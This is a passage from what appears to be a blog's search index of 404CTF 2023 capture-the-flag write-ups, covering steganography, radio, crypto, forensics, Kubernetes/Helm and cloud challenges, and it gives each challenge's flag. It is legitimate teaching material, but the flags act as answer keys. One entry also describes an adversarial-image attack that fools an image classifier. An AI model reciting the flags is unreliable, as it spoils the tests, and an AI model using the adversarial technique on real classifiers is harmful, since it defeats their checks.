morse)print(\"\\n---------------------\\n\")print(\"Flag: 404CTF{\"+ decrypt(morse).lower() + \"}\")And thanks to that, we get the flag:The flag is 404CTF{facilelemorse}" }, { "title": "CTFs | 404CTF_2023 | Stega | Les Félicitations", "url": "/CTFs/404CTF_2023/Stega/Les_Felicitations", "categories": "CTFs, 404CTF_2023, Stega", "tags": "Stega, Text", "date": "2023-06-07 00:00:00 +0200", "snippet": "Les FélicitationsIn this challenge, we just have the above text. If we try to decode the morse, we just find LE CODE MORSE CEST SYMPA MAIS LA CA SERT A RIEN HAHA… Nothing helpful. But if they put something like that in the text, it should be for a reason…And if we take the text as 3 paragraphs, we can find 3 words. To do so, we need to take the first character of the first line, the second of the second line and so on… Note that spaces are counted as characters so don’t forget them (as I did :’( ).So the first paragraph is:**T**ous étaient réunis dans la salle,C**r**iblant leur feuille de mots et posant leurs esprits sur papier.Tr**è**s encouragés par le déroulement des opérations,Il **s**uffisait simplement de les regarder pour voir leur dévotionSo we got Très, now for the second paragraph:**B**eaucoup d'entre eux étaient fiers de leur oeuvreC**i**llant à peine quand dehors, un monstre jappaitFi**e**rté mène cependant à orgueilEt **n**'oubliez pas qu'orgueil mène à perte.Now we have Bien, and last but not least:**J**uste au moment où leurs travaux allaient finir,H**o**rs du laboratoire, un cri retentissant fut émisPe**u** d'humains avaient entendu ce genre de cris.Ext**é**nués par cette énième attaque, les scientifiques se remirent au travail.And we have now Joué. So the final flag is 404CTF{TrèsBienJoué}." }, { "title": "CTFs | 404CTF_2023 | Stega | Le Rouge et le vert, avec un soupçon de bleu", "url": "/CTFs/404CTF_2023/Stega/Le_Rouge_et_le_vert_avec_un_soupcon_de_bleu", "categories": "CTFs, 404CTF_2023, Stega", "tags": "Stega, Text, ASCII", "date": "2023-06-07 00:00:00 +0200", "snippet": "Le Rouge et le vert, avec un soupçon de bleuIn this challenge, we just have this image, but only the end is interesting:If we try to decode the text 76 321021089710332 115116581089795118 95 1109599 108 114115125, we get L flag st:la_v_n_clrs}. If we replace the missing values by Xs, we get LX flag Xst:la_vXX_Xn_cXXlXXrs}. So first, we can notice that the first part should be Le flag est. From this we could have guessed that a space is equivalent to an e and so get Le flag est:la_vXe_en_cXXleXrs}.Now we are just missing a few characters. We and guess the i of vie and the word couleur can also be guessed.This gives us the flag 404CTF{la_vie_en_couleurs}" }, { "title": "CTFs | 404CTF_2023 | Stega | L'Œuvre", "url": "/CTFs/404CTF_2023/Stega/L_Oeuvre", "categories": "CTFs, 404CTF_2023, Stega", "tags": "Stega, Image, Aperisolve", "date": "2023-06-07 00:00:00 +0200", "snippet": "L’ŒuvreIn this challenge, we are given the following image:We just had to put it in an image steganography tool like Aperisolve to find the answer:The flag is 404CTF{C3z4m3_ouVr3_To1}" }, { "title": "CTFs | 404CTF_2023 | Radio | NAVI", "url": "/CTFs/404CTF_2023/Radio/NAVI", "categories": "CTFs, 404CTF_2023, Radio", "tags": "Radio, Audacity", "date": "2023-06-07 00:00:00 +0200", "snippet": "NAVIIn this challenge, we are given a raw audio file. We can hear the audio clearly when it is at a rate of 22050Hz. But it is like there is a voice on top of this audio. I tried different combinations and the one that fitted best our need was:=&gt; Rate 48000Hz=&gt; Reverse the audioI made those modifications in Audacity. For the Rate you can set it when importing the audio file as Raw or you can set it as shown below: You have to click on the arrow at the top, select the Rate and finally set it to 48000Hz.Now, we can like a voice but reversed. We can use the Reverse tool in the Effect tab and then heading to the Special section:Now that we have the audio at the correct rate and reverse, we can listen to what the man says (at 2m32s):The text is La solution est en hexadecimal 34 30 34 43 54 46 7b 31 74 72 30 5f 34 55 78 5f 52 34 64 31 30 2d 66 52 33 71 55 33 4e 63 33 35 7dWe can convert this from hex to text, and we get the flag 404CTF{1tr0_4Ux_R4d10-fR3qU3Nc35}" }, { "title": "CTFs | 404CTF_2023 | Radio | Ballistic Missile Submarine", "url": "/CTFs/404CTF_2023/Radio/Ballistic_Missile_Submarine", "categories": "CTFs, 404CTF_2023, Radio", "tags": "Radio, Audacity", "date": "2023-06-07 00:00:00 +0200", "snippet": "Ballistic Missile SubmarineWe are given an audio file and told to set the frequency to 192 kHz. We can set the rate by clicking on the arrow near the audio file name:We now use the spectrogram but don’t see anything interesting… Or do we ?We can use the Zoom to fit feature to see everything. To access this option, you need to left click where the numbers are shown on the left:Now we can see something that looks like dash and dots near 50kHz:When zooming near 40kHz, we can see the following:We can now decode this morse using tools like CyberChef:The flag is 404CTF{P4UL_V3R14IN3_35T_UN_M0R53_?}" }, { "title": "CTFs | 404CTF_2023 | Radio | Avez-vous vu les cascades du hérisson ?", "url": "/CTFs/404CTF_2023/Radio/Avez_vous_vu_les_cascades_du_herisson", "categories": "CTFs, 404CTF_2023, Radio", "tags": "Radio, Audacity, Waterfall", "date": "2023-06-07 00:00:00 +0200", "snippet": "Avez-vous vu les cascades du hérisson ?In this challenge, we are given a raw audio file. When listening to it, we don’t hear anything… But looking at the spectrogram gives us quite the result: You may have only yellow stuff and not this beautiful result. If so, when you import your raw data, don’t forget to click on Detect before clicking on Import once your audio is selected.We don’t see everything, we may use the Zoom to fit feature to see everything. To access this option, you need to left click where the numbers are shown on the left.Now we have everything:But this is pretty hard to read. To have a better result I used the following settings for the spectrogram: You can access those settings by clicking on the arrow, near the name of the audio, then click on spectrogram settingsWe can play with the size of the audio and the zoom on it to get this:We can now see the flag by squinting 404CTF{413X4NDR3_D4N5_UN3_C45C4D35_?}" }, { "title": "CTFs | 404CTF_2023 | Programmation | L'Inondation", "url": "/CTFs/404CTF_2023/Programmation/L_Inondation", "categories": "CTFs, 404CTF_2023, Programmation", "tags": "Programmation", "date": "2023-06-07 00:00:00 +0200", "snippet": "L’InondationIn this challenge, we can connect to a netcat server and we will be prompted with the message «Allez, vite, il y a une pile de photos assez importante à traiter,comptes-moi le nombre de rhinos par photo. ». Which means we need to recover the amount of rhinos that is printed. A rhino is printed as ~c'°^).I used the following function to get the text from the netcat server, send the number of rhinos found and return the text received:def find_rhino():\t\ttext = io.recvuntil(\"&gt; \").strip().decode(\"utf-8\")\t# count the number of rhinos by splitting the string into an array of rhinos and getting the length\trhinos = len(text.split(\"~c`°^)\"))-1\tio.sendline(str(rhinos))\treturned_text = io.recvline().strip().decode(\"utf-8\")\treturn returned_textThen I used this while loop to use this function until I can’t find any more rhinos:flag = find_rhino()while \"Très bien, la suite arrive\" in flag:\ttry:\t\tflag = find_rhino()\texcept Exception as e:\t\tprint(io.recvline().decode(\"utf-8\"))\tsleep(0.1)At the end we get the full code:from pwn import *from time import sleepHOST, PORT = \"challenges.404ctf.fr\", 31420 io = remote(HOST, PORT)def find_rhino():\t\ttext = io.recvuntil(\"&gt; \").strip().decode(\"utf-8\")\trhinos = len(text.split(\"~c`°^)\"))-1\tio.sendline(str(rhinos))\treturned_text = io.recvline().strip().decode(\"utf-8\")\treturn returned_textflag = find_rhino()while \"Très bien, la suite arrive\" in flag:\ttry:\t\tflag = find_rhino()\texcept Exception as e:\t\tprint(io.recvline().decode(\"utf-8\"))\tsleep(0.1)By executing this code we get:The flag is 404CTF{4h,_l3s_P0uvo1rs_d3_l'iNforM4tiqu3!}." }, { "title": "CTFs | 404CTF_2023 | Programmation | Des mots, des mots, des mots", "url": "/CTFs/404CTF_2023/Programmation/Des_mots_des_mots_des_mots", "categories": "CTFs, 404CTF_2023, Programmation", "tags": "Programmation", "date": "2023-06-07 00:00:00 +0200", "snippet": "Des mots, des mots, des motsIn this challenge, we need to access a netcat server and create a code that will respect the different rules stated:The rule 0 is an example. It just ask us to send back the same string. So, because we have cosette, we send cosette.For the rule 1, we need to reverse all the characters. So cosette become ettesoc.For the rule 2, if the word has an even number of letters, swap the 1st and 2nd parts of the resulting word. Otherwise, remove all the letters in the word corresponding to the central letter.We had ettesoc, so we now need to send ttsoc because the length of the word is odd, then we remove the letter e that is at the center of the word.For the 3rd rule, if the word has 3 or more letters, then if the 3rd letter of the resulting word is a consonant, “shift” the vowels to the left in the original word, then reapply rules 1 and 2. Otherwise: same thing, but shift them to the right. If the word has less than 3 letters we just return the word. This “shift” just means that we need to move only the vowels. The consonant doesn’t change position. The example is poteau that become petauo after the left shift. As you can see, the p is still the first letter and the t is still the 3rd letter. Only vowels have moved. So ttsoc become ottsc.The 4th rule is the harder one. To explain it I will show and explain the code to solve it:def regle4(mot):\tmot = list(mot)\tn = 0\twhile n &lt; len(mot):\t\tc = mot[n]\t\t# check if c == consonne\t\tif c.lower() not in voyelles and c.isalpha():\t\t\tvp = getVoyelle(c)\t\t\ts = mySomme(mot, n)\t\t\ta = ((vp + s) % 95) + 32\t\t\tmot.insert((n+1),chr(a))\t\tn += 1\treturn \"\".join(mot)Here, for each letter, we will check if it’s a vowel. If it is, we will do the calculation, if not we just pass. The calculation is a = ((vp + s) % 95) + 32. Where vp is the ASCII code of the vowel preceding the consonant c in the alphabet (if c = 'F', vp = ord('E') = 69). And s = SUM{i=n-1 -&gt; 0}(a{i}*2^(n-i)*Id(l{i} is a vowel)), where a{i} is the ASCII code of the i-th letter of the word, Id(x) is 1 if x is true, 0 otherwise, and l{i} is the i-th letter of the word.For more information about how I did the calculation of a, s and vp, you can find the hole code hereNow that we have a code that can translate a word, we automate that to translate the given text and we get the flag:So the final flag is: 404CTF{:T]cdeikm_)W_doprsu_nt_;adei}" }, { "title": "CTFs | 404CTF_2023 | IA | Le Petit Chat", "url": "/CTFs/404CTF_2023/IA/Le_Petit_Chat", "categories": "CTFs, 404CTF_2023, IA", "tags": "IA, MNIST, Images", "date": "2023-06-06 00:00:00 +0200", "snippet": "Le Petit ChatFirst of all we need to understand a bit what the code does. The first part of the code just loads the ResNet50 model. This model is already trained. So we can’t modify any weight in this neural network to bypass the verification done after in the code. Then the image is loaded and the server checks if it is recognised as a teapot. Then the server look at each pixel of the given image (the cat we give) and check if it is the same as the original one more or less 70. If the modification is less than 70 then it’s ok. This basically means that we can’t just take an image of a teapot and send it to the server.Then we need to find attacks that are available for this. And I found this Google Colab. This Colab tells us about Adversarial attacks.Adversarial attacks are techniques used to intentionally manipulate or deceive artificial intelligence (AI) models. The goal of these attacks is to exploit vulnerabilities in the model’s behavior and trick it into making incorrect predictions or classifications. Adversarial attacks typically involve introducing carefully crafted, imperceptible modifications to the input data, such as images or text, in order to deceive the model. These attacks can be designed to cause misclassification, bypass security measures, or exploit weaknesses in AI systems. Adversarial attacks are important to study as they help researchers and developers understand the limitations of AI models and develop more robust and secure systems.This github code gives us everything we need to be able to perform this attack. We can now run the following command:python generate_adversarial_example_targeted.py chat.jpg \"teapot\"We can now host our image of a cat that is now a beautiful teapot as you can see:We can now connect to the nc server and give the URL of our cat to it:The flag is 404CTF{qU3l_M4n1f1qu3_the13R3_0r4ng3}" }, { "title": "CTFs | 404CTF_2023 | IA | De la poésie", "url": "/CTFs/404CTF_2023/IA/De_la_poesie", "categories": "CTFs, 404CTF_2023, IA", "tags": "IA, MNIST, Images", "date": "2023-06-06 00:00:00 +0200", "snippet": "De la poésieIn this challenge, we need to recognise 6535 images and do something with them.I found a Google Colab that did some hand writting number recognition. I added this code at the end:from google.colab import drive# get the zip archive from my drive and unzip it\"\"\"drive.mount('/content/drive')!cp drive/MyDrive/poeme.zip .!unzip poeme.zip\"\"\"import osfrom PIL import Imagefrom torchvision.transforms import ToTensorpredictions = []work_dir = os.getcwd() for i in range(6536): # Load the image from the given path and convert it to grayscale img = Image.open(img_path).convert('L') # Convert the image to a tensor img = ToTensor()(img) # Add an extra dimension to the tensor to represent the batch size img = img.unsqueeze(0) # Make a prediction using the CNN model on the image pred_result = cnn.predict(img) # Convert the prediction result to a string and append it to the list of predictions predictions.append(str(pred_result[0]))print(''.join(predictions))This will give us a really long string of integer. We now need to focus on the hint given in the text Être pair ou ne pas l'être. (to be even or not to be).We can try to set every even number as a 0 and every odd number as 1. We then split in block of 8 and decode the binary character found in ASCII.chaine = \"6580616563912104...\"chaine = list(chaine)def pair_impair(): pair = \"\" impair = \"\" for i in range(len(chaine)): if int(chaine[i]) % 2 == 0: pair += chaine[i] else: impair += chaine[i] print(pair) print(impair)def split_string(string, length): return [string[i:i+length] for i in range(0, len(string), length)] substring_length = 8substrings = split_string(chaine, substring_length)flag = []new_chaine = \"\"for chaines in substrings: for num in chaines: #pair if int(num) % 2 == 0: new_chaine += \"0\" else: new_chaine += \"1\" flag.append(new_chaine) new_chaine = \"\"# Convert each segment to decimal and then to ASCII characterflag = ''.join([chr(int(segment, 2)) for segment in flag])print(flag)There are some errors in the process of number recognition but we can find the flag 404CTF{d3_L4_p03S1e_qU3lqU3_P3u_C0nT3mp0r4in3}" }, { "title": "CTFs | 404CTF_2023 | Forensique | Pêche au livre", "url": "/CTFs/404CTF_2023/Forensique/Peche_au_livre", "categories": "CTFs, 404CTF_2023, Forensique", "tags": "Forensique, Wireshark", "date": "2023-06-06 00:00:00 +0200", "snippet": "Pêche au livreIn this challenge, we are given a Wireshark capture available here.To solve this challenge, we just have to dump all the file of the HTTP traffic like this:We can click then on Save All or just save the images one by one:We can now look at the images:And if we open the Hegel-sensei-uwu.png file, we get the flag:The flag is 404CTF{345Y_W1r35h4rK}" }, { "title": "CTFs | 404CTF_2023 | Forensique | Note de bas de page", "url": "/CTFs/404CTF_2023/Forensique/Note_de_bas_de_page", "categories": "CTFs, 404CTF_2023, Forensique", "tags": "Forensique, Wireshark, Acropalypse, Crop", "date": "2023-06-06 00:00:00 +0200", "snippet": "Note de bas de pageIn this challenge, we are given a backup.pst file.PST (Personal Storage Table) files are a file format used by Microsoft Outlook to store email messages, calendar events, contacts, and other data. PST files are used for local email storage and provide users with the ability to access their emails and other Outlook data even when not connected to a mail server.I found this online tool :As we can see there is a picture in the attachment. The picture is:The image seems to have the flag at the bottom right corner, but we only have 404CTF{L… Looking at some CVE that may allow us to recover the full image we can find CVE-2023-21036. This CVE tells us that if a Pixel phone from Google truncate an image it is possible to recover the initial image because it didn’t truncate is and save the result in a new file but instead just added an IEND sooner.We can now use this tool to recover the whole image. I then run the gui.py and set these options:Now we just have to wait and save the result…The final image is:Impressive!!! The flag is 404CTF{L3_f0rM1d@bl3_p09r35_d3s_lUm13re5}" }, { "title": "CTFs | 404CTF_2023 | Forensique | Lettres volatiles", "url": "/CTFs/404CTF_2023/Forensique/Lettres_volatiles", "categories": "CTFs, 404CTF_2023, Forensique", "tags": "Forensique, Volatility", "date": "2023-06-06 00:00:00 +0200", "snippet": "Lettres volatilesIn this challenge we are given a Windows home directory of the user C311M1N1. When looking around, we can find a zip file containing a pdf that is protected by a password:This may be where the flag is hidden. We can try to find the password now. In the directory Documents/JumpBag/ we find a raw file that we can analyse using Volatility. In this particular case, we need to use volatility2. We first need to find the correct profile: Here is a, non complete, but still useful cheat-sheet about basic command in Volatiltiy2 and their equivalent in Volatiltiy3Now that we have the correct profil, we can execute any command we want. I tried looking a process running, on the network, at process to dump… But didn’t find anything interesting. I then found the command clipboard that allows us to get the content of the clipboard and…We then use the password F3eMoBon8n3GD5xQ on the s3cR37.zip file and… Voilà:When we open the PDF file we get:The flag is 404CTF{V0147i1I7y_W1Ll_N3v3r_Wr8_loV3_l3ttEr5}" }, { "title": "CTFs | 404CTF_2023 | Forensique | Les Mystères du cluster de la Comtesse de Ségur", "url": "/CTFs/404CTF_2023/Forensique/Les_Mysteres_du_cluster_de_la_Comtesse_de_Segur", "categories": "CTFs, 404CTF_2023, Forensique", "tags": "Forensique, K8s", "date": "2023-06-06 00:00:00 +0200", "snippet": "Les Mystères du cluster de la Comtesse de SégurFor this challenge, we need to recover the flag from a folder containing information about a cluster.When looking at the files, we see a folder checkpoint.A checkpoint folder is a directory in Kubernetes where checkpoint information is stored for a particular application or process. The checkpoint folder is a crucial part of Kubernetes stateful applications, as it enables applications to restart from where they left off in case of a failure or a system crash. The checkpoint folder typically contains metadata, state information, and any other necessary resources required to restore the application’s state. This folder is usually located on a persistent volume, which enables it to survive pod and node restarts. It is worth noting that the location of the checkpoint folder may vary depending on the Kubernetes setup. However, it is usually specified in the pod’s YAML configuration file or through a command-line argument. In summary, the checkpoint folder is a vital component in Kubernetes stateful applications, as it provides the necessary information required to restore an application’s state in case of a failure or system crash.When we take a closer look at the files in this checkpoint folder, we see a lot of .img files:Using a basic sudo grep -iRl 404ctf . command to find any file that may contain this string (case insensitive with the -i) we find only one file:We can look at what we found by using the grep command piped with the string:We see that a zip file is uploaded using the cURL command on the domain agent.challenges.404ctf.fr. When we open the zip file, we can see two files:The agent file is a Linux executable that need to be run on K8s and the flag.txt gives us what we are looking for: 404CTF{K8S_checkpoints_utile_pour_le_forensic}" }, { "title": "CTFs | 404CTF_2023 | Forensique | Le Mystère du roman d'amour", "url": "/CTFs/404CTF_2023/Forensique/Le_Mystere_du_roman_d", "categories": "CTFs, 404CTF_2023, Forensique", "tags": "Forensique, Vi, SWP", "date": "2023-06-06 00:00:00 +0200", "snippet": "Le Mystère du roman d’amourIn this challenge, we are given a swp file available here. By reading about this type of file we find that SWP files, also known as swap files, are temporary files created by text editors, particularly Vi/Vim, to store changes made to a file while it is being edited. These files are used to recover unsaved changes in the event of a system crash, editor crash, or other unexpected interruptions.We get practically all the flag when we just use the file command on the file:The PID is 168, the full path to the file is ~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt and so, the name of the Rouletabille’s friend is jaqueline and the hostname is aime_ecrire.By reading about how to recover the initial content of the swp file, I found that we need to use the command vim -r fichier-etrange.swp :We now press enter and to save what seems to be a PNG file we hit :w found_image.png then we quit vi using :q!:This doesn’t seems really helpfull so i try to upload it to Aperisolve. I then find the hiddden QRCode in the image:The result of the QRCode is:Il était une fois, dans un village rempli d'amour, deux amoureux qui s'aimaient...Bien joué ! Notre écrivaine va pouvoir reprendre son chef-d'oeuvre grâce à vous !Voici ce que vous devez rentrer dans la partie \"contenu du fichier\" du flag : 3n_V01L4_Un_Dr0l3_D3_R0m4NThe final flag is then: 404CTF{168-~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt-jaqueline-aime_ecrire-3n_V01L4_Un_Dr0l3_D3_R0m4N}" }, { "title": "CTFs | 404CTF_2023 | Crypto | Recette", "url": "/CTFs/404CTF_2023/Crypto/Recette", "categories": "CTFs, 404CTF_2023, Crypto", "tags": "Crypto, Base85, DeadFish, Hex", "date": "2023-06-06 00:00:00 +0200", "snippet": "RecetteIn this challenge, we are given the hex string:32 69 31 73 34 69 31 73 31 35 64 31 6f 34 39 69 31 6f 34 64 31 6f 33 69 31 6f 31 35 64 31 6f 32 32 64 31 6f 32 30 64 31 6f 31 39 69 31 6f 37 64 31 6f 35 64 31 6f 32 69 31 6f 35 35 69 31 6f 31 64 31 6f 31 39 64 31 6f 31 37 64 31 6f 31 38 64 31 6f 32 39 69 31 6f 31 32 69 31 6f 32 36 69 31 6f 38 64 31 6f 35 39 64 31 6f 32 37 69 31 6f 36 64 31 6f 31 37 69 31 6f 31 32 64 31 6f 37 64 31 6f 35 69 31 6f 31 64 31 6f 32 64 31 6f 31 32 69 31 6f 39 64 31 6f 32 36 64 31 6fWe need to convert from hexadecimal, expand so that no digits are visible, decode DeadFish and convert from Base 85.I used the following code:import base64# Hexadecimal string to decodehex_str = \"3269317334693173313564316f343969316f3464316f3369316f313564316f323264316f323064316f313969316f3764316f3564316f3269316f353569316f3164316f313964316f313764316f313864316f323969316f313269316f323669316f3864316f353964316f323769316f3664316f313769316f313264316f3764316f3569316f3164316f3264316f313269316f3964316f323664316f\"# Decode hexadecimal string to bytesbytes_str = bytes.fromhex(hex_str).decode()# set the letters by group of n where n is the digit preceding the letternumerical_str = \"\"i = 0while i &lt; len(bytes_str):\tif bytes_str[i].isdigit():\t\t\tif bytes_str[i+1].isdigit():\t\t\t\tnum = int(bytes_str[i]+bytes_str[i+1])\t\t\t\tnumerical_str += bytes_str[i+2]*num\t\t\t\ti+= 2\t\t\telse:\t\t\t\tnum = int(bytes_str[i])\t\t\t\tnumerical_str += bytes_str[i+1]*num\t\t\t\ti+= 1\telse:\t\tnumerical_str += bytes_str[i]\ti+=1print(numerical_str)This code basically just decodes the hexadecimal string at first. Then it will do like in a recipe. If we have 3 eggs we will use the notation 3 Eggs, here it’s the same. If we have a string 3e2i then we will get eeeii.This code will output:iisiiiisdddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddoiiiodddddddddddddddoddddddddddddddddddddddoddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiodddddddodddddoiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiododddddddddddddddddddodddddddddddddddddoddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiiiiiiiiiiiioddddddddddddodddddddoiiiiiododdoiiiiiiiiiiiiodddddddddoddddddddddddddddddddddddddoAnd after that we can use the online tool dcode to decode this DeadFish. When we decode this string as ASCII characters, we get 1b^aR&lt;(;4/1hgTC1NZtl1LFWKDIHFRI/. And finally, we can use again dcode for the base85 decoding and we get the flag 404CTF{M4igr3t_D3_c4naRd}" }, { "title": "CTFs | 404CTF_2023 | Crypto | Dessine-moi une courbe elliptique", "url": "/CTFs/404CTF_2023/Crypto/Dessine_moi_une_courbe_elliptique", "categories": "CTFs, 404CTF_2023, Crypto", "tags": "Crypto, Elliptic Curve, Maths", "date": "2023-06-06 00:00:00 +0200", "snippet": "Dessine-moi une courbe elliptiqueIn this challenge, we are given the following code and its output.After some research on the elliptic curves, I found this blog that explains how they solved a CTF. It is not like us because they have a and b, and that’s what we are looking for. But in this WU, we find the formula for the elliptic curve on the finite field that is y**2=x**3+ax+b (where ** is the mathematical power ). Note that I stated that its an elliptic curve on the finite field because of what is said in the little story above and because, as in the challenge code, we have the formula 4a**3+27b**2%p!=0 that need to be true.But the more acurate equation is y**2=x**3+ax+b%p. We have two point on the curve, H and G. We can take the x and y coordinates as G_x and G_y (recpectively H_x and H_y).So we have the following equations:G_y**2 = G_x**3+a*G_x+b%p andH_y**2 = H_x**3+a*H_x+b%pLet’s simplify the equations by removing, for now, the modulus p. We can find the value of b:G_y**2 = G_x**3+a*G_x+b&lt;=&gt; G_y**2 - G_x**3 = a*G_x+b&lt;=&gt;G_y**2 - G_x**3 - a*G_x = b&lt;=&gt;b = G_y**2 - G_x**3 - a*G_xandH_y**2 = H_x**3+a*H_x+b&lt;=&gt; H_y**2 - H_x**3 = a*H_x+b&lt;=&gt;H_y**2 - H_x**3 - a*H_x = b&lt;=&gt;b = H_y**2 - H_x**3 - a*H_xNow that we just found the equation to solve b for G and H, we can mix both equations because they are both equal to b:b = G_y**2 - G_x**3 - a*G_xandb = H_y**2 - H_x**3 - a*H_x=&gt;G_y**2 - G_x**3 - a*G_x = H_y**2 - H_x**3 - a*H_x&lt;=&gt;G_y**2 - G_x**3 - H_y**2 + H_x**3 = a*G_x - a*H_x&lt;=&gt;G_y**2 - G_x**3 - H_y**2 + H_x**3 = a*(G_x - H_x)&lt;=&gt;(G_y**2 - G_x**3 - H_y**2 + H_x**3)/(G_x - H_x) = a&lt;=&gt;a = (G_y**2 - G_x**3 - H_y**2 + H_x**3)/(G_x - H_x)Now, before replacing the xs and ys, we first need to put back the modulus. For the equation to be still valid, we need to have:a = ( (G_y**2 - G_x**3 - H_y**2 + H_x**3)* pow((G_x - H_x), -1,p) ) % pThis will do a division modulus p and the whole calculation needs to be modulus p.So we have:a = ( (G_y**2 - G_x**3 - H_y**2 + H_x**3)* pow((G_x - H_x), -1,p) ) % pandb = ( G_y**2 - G_x**3 - a*G_x ) % pI then put everything in a python code available here.We can run this code, and we have the flag:The flag is 404CTF{70u735_l35_gr4nd35_p3r50nn3s_0nt_d_@b0rd_373_d35_3nf4n7s}" }, { "title": "CTFs | 404CTF_2023 | Crypto | ASCON Marchombre", "url": "/CTFs/404CTF_2023/Crypto/ASCON_Marchombre", "categories": "CTFs, 404CTF_2023, Crypto", "tags": "Crypto, ASCON, DeadFish, Hex", "date": "2023-06-06 00:00:00 +0200", "snippet": "ASCON MarchombreIn this challenge, we are given an ASCON encrypted text and multiple values to be able to decrypt it.ASCON is a lightweight authenticated encryption algorithm designed to provide security with low resource usage. It operates on a fixed-length message and key and provides confidentiality and integrity of the data. ASCON uses a permutation-based design and features a simple and efficient implementation. It is resistant to various cryptographic attacks, including differential and linear cryptanalysis. ASCON is suitable for constrained environments, such as embedded systems or Internet of Things (IoT) devices, where limited resources are available.I found this github that allows us to decrypt the text. I took the necessary code and assembled this one. We just have to run it and… VoilàThe flag is 404CTF{V3r5_l4_lum1èr3.}" }, { "title": "CTFs | 404CTF_2023 | Cloud | Le sot", "url": "/CTFs/404CTF_2023/Cloud/Le_sot", "categories": "CTFs, 404CTF_2023, Cloud", "tags": "Cloud, AWS, S3, Bucket", "date": "2023-06-06 00:00:00 +0200", "snippet": "Le sotFor this challenge, we need to access the bucket cloud-intro-challenge. I first try to connect using the aws command but it didn’t work because we don’t have credentials.I then found this website that explains how to access S3 buckets, but you may have found the official method on the AWS website.So we just use the URL https://cloud-intro-challenge.s3.gra.io.cloud.ovh.net/ and we have the following result:It is not quite easy to read it because there is no carriage return but if you go into the source code, you can see the Key value contain the file we want to access:As stated in the previous link, to access a file on a bucket we need to look for https://BUCKET-NAME.s3.region-code.amazonaws.com/KEY-NAMEWe then go to https://cloud-intro-challenge.s3.gra.io.cloud.ovh.net/les-moutons.json and we find the file containing the flag:Flag: 404CTF{D35_m0utOns_D4n5_13s_NU@g3s}" }, { "title": "CTFs | 404CTF_2023 | Cloud | Le Cluster de Madame Bovary", "url": "/CTFs/404CTF_2023/Cloud/Le_Cluster_de_Madame_Bovary", "categories": "CTFs, 404CTF_2023, Cloud", "tags": "Cloud, K8s, kubctl, Pods", "date": "2023-06-06 00:00:00 +0200", "snippet": "Le Cluster de Madame BovaryEnumerationFor this challenge, we are given a virtual machine. When we arrive on the machine we first run the kubctl command to find pods:As we can see, there is one pod agent. A Pod in Kubernetes is the smallest deployable unit that represents a running process. It can contain one or more containers that share the same network and storage resources. Pods are used to encapsulate and manage containers, providing an abstraction layer for scheduling, scaling, and managing applications within a Kubernetes cluster.We can access the pod and find an executable in the /opt folder:If we try to run it, we get the same result as if we ran the command kubctl logs agent:First ExploitationWhen looking at docker hub, we can find this container here. We can’t just use it on our own machine because we get an error for not running it on Kubernetes (K8s). So I created a script to deploy a pod that will deploy this container:apiVersion: apps/v1kind: Deploymentmetadata: name: thecontainer404 namespace: 404ctfspec: replicas: 1 selector: matchLabels: app: thecontainer404 template: metadata: labels: app: thecontainer404 spec: containers: - name: thecontainer404 image: 404ctf/the-container I specified the namespace 404ctf because if you don’t, you will get an error saying that the container desn’t run on the correct namespace (err: not in namespace 404ctf). To create it, run the command kubectl create namespace 404ctfWe can deploy our pod using the command:kubectl apply -f deployment.yml Get the first part of the flagWe now can access the pod using the command kubectl exec -it deployment.apps/thecontainer404 --namespace=404ctf -- sh: Don’t forget the --namespace=404ctf. If you do, you will get an error saying that the pod wasn’t found.When executing /opt/the-container, we get several errors that we can correct:We have the first half of the flag 404CTF{A_la_decouv. We know now that the rest of the flag is in the container 404ctf/web-server. We do the same steps as before and once on the machine we find a Go program for a webserver:Get the second part of the flagWe can read the content of web-server.go and find the flag:Or just request it with the cURL command:The complete flag is then: 404CTF{A_la_decouverte_de_k8s}" }, { "title": "CTFs | 404CTF_2023 | Cloud | Harpagon et le magot", "url": "/CTFs/404CTF_2023/Cloud/Harpagon_et_le_magot", "categories": "CTFs, 404CTF_2023, Cloud", "tags": "Cloud, Helm, K8s", "date": "2023-06-06 00:00:00 +0200", "snippet": "Harpagon et le magotFor this challenge, we are given an ssh connection to a server. The hint we are given is that Harpagon n'est pas très doué et n'a jamais réussi à utiliser sa cassette.. Which means that we need to do something with a cassette.What is HelmTo reach the flag, we need to use Helm.Helm is a powerful package manager for Kubernetes that facilitates the deployment and management of applications and services. It simplifies the process of installing, upgrading, and managing complex applications on Kubernetes clusters. With Helm, you can package your applications into charts, which contain all the necessary configurations, dependencies, and Kubernetes manifests. These charts can be easily shared and reused, fostering collaboration within the Kubernetes community. Helm also enables effective configuration management, allowing you to customize deployments for different environments. It provides a straightforward way to update or roll back applications, ensuring smooth updates and minimizing downtime. Overall, Helm enhances productivity, promotes consistency, and streamlines application management on Kubernetes. Note that you could have guessed the use of Helm because when you connect to the server, you see information links to K3s, Kubectl and Helm.Basic EnumerationWe now try some basic Helm command like helm list. This command allows us to get all the available charts:As we can see, and could have guessed, there is one chart named cassette, as in the hint. We can get more information about it by running the command helm history cassette: The helm history command provides information about the revision history of a release in Helm. When you deploy or upgrade a chart, Helm creates a new revision of that release.ExploitationWe can see that there are two revisions for the release cassette. The first one is superseded and the second one is deployed. A release is marked as superseded when a new revision of the release is deployed, effectively replacing the previous revision. This typically happens when you upgrade or roll back a release. The superseded revision is still stored in the release history, allowing you to roll back to it if needed.A release is marked as deployed when it represents the currently active or running revision of the release. It indicates that this particular revision is the one currently in use.So as stated in the definition, we can roll back to the superseded revision. To do so, run the command helm rollback cassette 1:As shown in the above screenshot, the message Rollback was a success! Happy Helming! shows us that everything went well. We can now get information about the register using the command helm get all cassette:The command gives us a lot of result, but we got the flag in the adminToken. If you went from the bottom of the output, you may have encountered the base64 encoded version of the flag fWVtMXRjaXZfN3MzX2wxXzduMGRfdUAzbGZfMV83czNfM2MxcjR2QGx7RlRDNDA0 but using the echo 